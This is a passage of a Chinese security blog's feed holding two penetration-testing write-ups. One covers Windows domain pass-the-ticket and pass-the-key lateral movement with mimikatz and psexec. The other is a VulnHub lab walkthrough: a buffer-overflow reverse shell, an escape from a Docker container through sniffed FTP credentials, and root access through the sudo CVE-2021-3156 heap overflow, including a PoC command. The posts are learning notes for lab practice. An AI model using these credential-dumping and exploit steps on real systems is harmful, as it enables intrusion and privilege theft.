&#x2F;user:administrator &#x2F;ptt</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308190455630.png" class title="image-20220308190455630"><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308190515961.png" class title="image-20220308190515961"><p>之后还可以使用psexec.exe 与域控建立交互式cmd，并且还是最高权限psexec.exe \DC.whoamianony.org cmd.exe</p><p>这是在域成员192.168.93.20上使用的psexec，kali可以打开远程桌面实现此功能</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308191224922.png" class title="image-20220308191224922"><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308191324307.png" class title="image-20220308191324307"><p>这个administrator是我们命名为这个的，制作票据的时候也可以命名为aaa，bbb等</p><h1 id="PTK：Pass-The-Key（密钥传递攻击）"><a href="#PTK：Pass-The-Key（密钥传递攻击）" class="headerlink" title="PTK：Pass The Key（密钥传递攻击）"></a>PTK：Pass The Key（密钥传递攻击）</h1><h2 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2><p>Kerberos 提供 4 种不同的密钥类型：DES、RC4、AES-128 和 AES-256</p><p>启用 RC4 etype 后，可以使用 RC4 密钥。问题是 RC4 密钥实际上是用户的 NT 哈希。使用 NT 散列获取 Kerberos 票证称为pass the hash</p><p>禁用 RC4 时，也可以传递其他 Kerberos 密钥（DES、AES-128、AES-256）。这种技术称为ptk。实际上，overpass hash 和 pass key 只是使用的 name 和 key 不同，技术是一样的。</p><p>传递的key是AES key，指定使用AES256</p><h2 id="PTK攻击的原理及条件"><a href="#PTK攻击的原理及条件" class="headerlink" title="PTK攻击的原理及条件"></a>PTK攻击的原理及条件</h2><p>1、可以在NTLM认证被禁止的情况下用来实现类似PtH的功能</p><p>2、需要目标用户帐户的 NTLM 哈希（或密码）</p><p>因此，一旦获得用户哈希，就可以为该帐户请求 TGT。最后，可以<strong>访问****用户帐户具有权限的</strong>任何服务或机器。</p><h2 id="PTK的各种攻击手法"><a href="#PTK的各种攻击手法" class="headerlink" title="PTK的各种攻击手法"></a>PTK的各种攻击手法</h2><h3 id="一、mimikatz-1"><a href="#一、mimikatz-1" class="headerlink" title="一、mimikatz"></a>一、mimikatz</h3><p>privilege::debug</p><p>sekurlsa::ekeys</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308192816206.png" class title="image-20220308192816206"><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308193145797.png" class title="image-20220308193145797"><p>芭比q了这个机器没有aes-256。。</p><p>如果有的话在mimikatz输入  sekurlsa::pth &#x2F;user:administrator &#x2F;domain:whoamianony.org &#x2F;aes256:获取到的aes值</p><p>然后就可以进行远程连接了，可以进行dir \\DC\c$等操作，其实和pth非常类似</p><h3 id="二、impacket工具包"><a href="#二、impacket工具包" class="headerlink" title="二、impacket工具包"></a>二、impacket工具包</h3><p>ptk也有很多impacket脚本使用，使用方法都大同小异，这里太累了就不演示了。</p><p>总结：ptt&amp;pth&amp;ptk是域渗透中常见的横向移动与维权方法，之前刚学的时候，都只是大概知道怎么回事，时不时还会弄混，但是自己静下心来好好琢磨了一段时间过后发现其实这三种方法也不是很难，思路一下清晰了很多。对于文章来说的话，有些地方可能有小问题，有些地方还有不知原因的报错。但大体来说比较满意，因为文章只做自己复习学习用。</p>]]></content>
    
    
    <summary type="html">网上也有很多关于pth&amp;ptt&amp;ptk的文章，这里仅作自己更深入理解</summary>
    
    
    
    <category term="内网" scheme="https://linus1124-root.github.io/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="域渗透" scheme="https://linus1124-root.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub之缓冲区溢出</title>
    <link href="https://linus1124-root.github.io/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <id>https://linus1124-root.github.io/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</id>
    <published>2022-03-04T12:31:11.000Z</published>
    <updated>2022-03-04T15:23:49.982Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初步的信息收集"><a href="#初步的信息收集" class="headerlink" title="初步的信息收集"></a>初步的信息收集</h1><p>对靶机进行端口扫描，看到开放了21端口留意可能有匿名登陆</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304203927341.png" class title="image-20220304203927341"><p>扫描一下端口开放的详细服务信息</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204123320.png" class title="image-20220304204123320"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204147762.png" class title="image-20220304204147762"><p>这种有ctf风格的靶场肯定不会开一个没有意义的端口的。。登陆ftp服务，顺便搜一波现成的漏洞。搜出来是ddos，打扰了。</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204345188.png" class title="image-20220304204345188"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204404524.png" class title="image-20220304204404524"><p>ftp中可能有好东西，看见的东西都下载到本机</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204505067.png" class title="image-20220304204505067"><p>查看下载的文件，运行下发现居然没东西</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204646309.png" class title="image-20220304204646309"><p>看到这里感觉不对劲，这是个可执行程序，执行了肯定有进程产生的，看一看进程吧</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204847774.png" class title="image-20220304204847774"><p>再联想到目标靶机开启了9898端口，八九不离十了这就是突破点，但还是看一看web服务吧</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205134019.png" class title="image-20220304205134019"><p>对web进行信息搜集一波，看看源代码，爆破一下目录</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205236054.png" class title="image-20220304205236054"><p>更确定了这极有可能是应用程序的漏洞，监听本地9898端口</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205522149.png" class title="image-20220304205522149"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205537331.png" class title="image-20220304205537331"><p>看到这里已经懂得都懂了，直接进入正题了</p><h1 id="edb调试"><a href="#edb调试" class="headerlink" title="edb调试"></a>edb调试</h1><p>如果kali没有安装edb-debugger，可以先安装一个</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205836105.png" class title="image-20220304205836105"><p>开启本地监听打开edb进行调试，这个地方一定要以root权限打开edb不然会有各种问题</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223641368.png" class title="image-20220304223641368"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223654911.png" class title="image-20220304223654911"><p>python生成500个A注入到程序中，观察edb发生的变化</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223811343.png" class title="image-20220304223811343"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223827023.png" class title="image-20220304223827023"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223855172.png" class title="image-20220304223855172"><p>（报错了，一切都在设想当中）</p><p>EIP寄存器全被被A占满，说明一定在这个参数输入的地方存在缓冲区溢出</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223926084.png" class title="image-20220304223926084"><p>理清思路接下来要干嘛</p><p>EIP寄存器存储接下来要执行指令的代码所在的内存地址，ESP是寄存具体的代码的。这两个寄存器的内容都可以进行覆盖，如果能找到一个jump to esp，跳转到esp这样的指令他所在内存空间的地址的话，就可以将这条指令的内存地址，写入到eip寄存器，从而利用jump esp指令强制cpu去执行esp中寄存的程序的代码，因此我们可以提交payload内容替换esp中的内容，可以在其中提交反弹shell的程序代码。因此可以修改eip当中的内容，从而将指令跳转到esp寄存器，esp中存储着我们的恶意代码，一旦这些代码被执行，就会反弹一个shell到kali。</p><p>理清思路后再想想第一步要干嘛，就是在eip寄存器当中写入jump esp这条指令的地址，那么首先就要在这500个A当中确定是从哪一个A开始覆盖了eip寄存器，kali当中msf-pattern_create可以生成随机的字符串</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304224821183.png" class title="image-20220304224821183"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304224830607.png" class title="image-20220304224830607"><p>注入随机字符串后，edb直接报错（每一次调试都要重新启动应用服务和edb）</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304224959040.png" class title="image-20220304224959040"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225012042.png" class title="image-20220304225012042"><p>现在eip中就是随机字符串当中四个字符的ASCII码，再查一下这四个字符再随机字符串的位置</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225131530.png" class title="image-20220304225131530"><p>这里也就是说，从112位置开始，eip寄存器被覆盖了四个字符</p><h1 id="脚本验证，EXP编写"><a href="#脚本验证，EXP编写" class="headerlink" title="脚本验证，EXP编写"></a>脚本验证，EXP编写</h1><p>写个脚本验证，果然eip被四个B占满</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225300919.png" class title="image-20220304225300919"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225319309.png" class title="image-20220304225319309"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225341987.png" class title="image-20220304225341987"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225443972.png" class title="image-20220304225443972"><p>（这里一定要以python2来执行验证脚本）</p><p>现在就要在edb中查找jump esp的指令地址，一定是有x执行权限的服务</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225558528.png" class title="image-20220304225558528"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225620876.png" class title="image-20220304225620876"><p>将结果插入到程序代码（B的位置），因为大头小头字节序，地址从低位到高位读取。’\x55\x9d\x04\x08’</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225751989.png" class title="image-20220304225751989"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225803607.png" class title="image-20220304225803607"><p>使用msf生成反弹shell的代码，要过滤坏字符，防止程序遇到\x00终止运行</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225903497.png" class title="image-20220304225903497"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225915589.png" class title="image-20220304225915589"><p>（空字符是保证程序不出错）</p><p>重启服务端程序设置nc监听</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225952851.png" class title="image-20220304225952851"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230010631.png" class title="image-20220304230010631"><p>（这是在本机做的实验）</p><p>将IP端口改为目标机器重新设置监听</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230210120.png" class title="image-20220304230210120"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230219455.png" class title="image-20220304230219455"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230229256.png" class title="image-20220304230229256"><h1 id="反弹shell后docker逃逸"><a href="#反弹shell后docker逃逸" class="headerlink" title="反弹shell后docker逃逸"></a>反弹shell后docker逃逸</h1><p>获得了一个普通权限shell，进行信息收集</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230349765.png" class title="image-20220304230349765"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230359143.png" class title="image-20220304230359143"><p>ssh连接22端口不行，那么就连接之前探测到的2222端口</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230442016.png" class title="image-20220304230442016"><p>好家伙，发现还是个docker容器，那就docker逃逸吧</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230618570.png" class title="image-20220304230618570"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230628961.png" class title="image-20220304230628961"><p>权限配置不当，容器有sudo权限，那就切换成容器的root，查看root文件</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230721118.png" class title="image-20220304230721118"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230733436.png" class title="image-20220304230733436"><p>查看两个文本文件得知，提示登陆ftp出错，要访问流量（ftp是基于明文的协议类型）</p><p>进行流量分析，只有命令行不能使用wireshark，使用tcpdump</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230851167.png" class title="image-20220304230851167"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230859891.png" class title="image-20220304230859891"><p>（接收到用户名密码）</p><p>使用账号密码登陆22端口的ssh服务，发现是宿主机</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230952447.png" class title="image-20220304230952447"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231001814.png" class title="image-20220304231001814"><h1 id="进一步信息收集，利用堆溢出漏洞提权"><a href="#进一步信息收集，利用堆溢出漏洞提权" class="headerlink" title="进一步信息收集，利用堆溢出漏洞提权"></a>进一步信息收集，利用堆溢出漏洞提权</h1><p>没有执行sudo的权限</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231226255.png" class title="image-20220304231226255"><p>检查内核没戏</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231252289.png" class title="image-20220304231252289"><p>抱着永不放弃的精神检查一下还有什么可利用的</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231431058.png" class title="image-20220304231431058"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231440102.png" class title="image-20220304231440102"><p>sudo版本低，还是Debian10，直接上谷歌</p><p><a href="https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231534664.png" class title="image-20220304231534664"><p>果然，这个版本的sudo有堆溢出</p><p>poc验证sudoedit -s ‘&#39; <code>perl -e &#39;print &quot;A&quot; x 65536&#39;</code></p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231633754.png" class title="image-20220304231633754"><p>（因输入的大小原因程序发生了错误）</p><p>msf当中有利用代码，show options缺啥补啥吧</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231712112.png" class title="image-20220304231712112"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231738788.png" class title="image-20220304231738788"><p>尝试多次后始终不行，怀疑这里有大坑</p><p>查找手动利用代码，<a href="https://github.com/worawit/CVE-2021-3156%EF%BC%8C%E4%BF%AE%E6%94%B9%E4%B8%80%E7%82%B9%E4%BB%A3%E7%A0%81">https://github.com/worawit/CVE-2021-3156，修改一点代码</a></p><p>一番搜寻过后原来这台机器的sudo路径与众不同。。信息收集的重要性体现出来了</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231935353.png" class title="image-20220304231935353"><p>打exp，nc来传输</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231958668.png" class title="image-20220304231958668"><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304232010595.png" class title="image-20220304232010595"><p>执行exp过后终于打点成功</p><img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304232045850.png" class title="image-20220304232045850"><p>总结：总的来说这台靶机挺有意思的，是很基础的溢出漏洞，但作为一台作者表明高难度的靶机确实有他的难处。缓冲区溢出这里是很原理性的操作，更高难度需要逆向分析的溢出这台还没体现出来，以后会慢慢更新。</p>]]></content>
    
    
    <summary type="html">缓冲区溢出初体验</summary>
    
    
    
    <category term="有难度的靶场" scheme="https://linus1124-root.github.io/categories/%E6%9C%89%E9%9A%BE%E5%BA%A6%E7%9A%84%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="缓冲区溢出" scheme="https://linus1124-root.github.io/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
</feed>
